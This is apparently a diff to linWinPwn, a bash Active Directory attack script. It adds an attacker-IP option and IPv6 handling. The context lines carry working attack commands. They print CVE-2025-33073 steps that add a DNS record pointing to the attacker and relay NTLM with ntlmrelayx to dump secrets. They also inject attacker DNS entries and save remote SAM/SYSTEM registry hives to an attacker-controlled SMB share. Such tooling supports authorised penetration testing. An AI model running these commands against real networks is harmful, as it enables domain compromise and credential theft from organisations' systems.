@@ -216,6 +216,7 @@ help_linWinPwn() {
     echo -e "--offline           Skip connection and authentication checks"
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
+    echo -e "-a/--attacker-ip    Attacker's IP address (overrides auto-detection; IPv4 or IPv6)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
     echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e "-U/--userwordlist   Custom username list used during Null session checks"
@@ -290,6 +291,22 @@ while test $# -gt 0; do
         attacker_IPv4="$(ip -f inet addr show "${2}" 2>/dev/null | sed -En 's/.*inet ([0-9.]+).*/\1/p' | head -1)"
         attacker_IPv6="$(ip -f inet6 addr show "${2}" 2>/dev/null | sed -En 's/.*inet6 ([0-9a-fA-F:]+).*/\1/p' | grep -vi '^fe80' | head -1)"
         attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+        attacker_IP_bracket=$(bracket_ip "$attacker_IP")
+        shift
+        ;;
+    -a | --attacker-ip)
+        attacker_IP="${2}"
+        if ! is_valid_ip "$attacker_IP"; then
+            echo -e "${RED}[-] Invalid attacker IP: ${attacker_IP}${NC}" >&2
+            exit 1
+        fi
+        if [[ "$attacker_IP" == *:* ]]; then
+            attacker_IPv6="$attacker_IP"
+            attacker_IPv4=""
+        else
+            attacker_IPv4="$attacker_IP"
+            attacker_IPv6=""
+        fi
         attacker_IP_bracket=$(bracket_ip "$attacker_IP")
         shift
         ;;
@@ -3443,6 +3460,7 @@ coerceplus_check() {
     if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
         echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        # bloodyAD add dnsRecord creates an A (IPv4) record; IPv6/AAAA is not supported upstream
         echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
@@ -3961,6 +3979,7 @@ dnsentry_add() {
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
             echo -e "${BLUE}[*] Adding new DNS entry ${hostname_dnstool} with IP ${attacker_IP} for Active Directory integrated DNS${NC}"
+            # bloodyAD add dnsRecord creates an A (IPv4) record; IPv6/AAAA is not supported upstream
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
         fi
     fi
@@ -4750,12 +4769,13 @@ samsystem_dump() {
         else
             set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
+            # impacket smbserver -ip does not bind IPv6; IPv4-only upstream
             echo -e "${impacket_smbserver} -ip ${attacker_IP} -smb2support lwpshare ${Credentials_dir}/"
             read -rp "" </dev/tty
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p "${Credentials_dir}/SAMDump_${user_var}/${i}"
-                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\${attacker_IP}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
+                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\${attacker_IP_bracket}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
             done
         fi
     fi
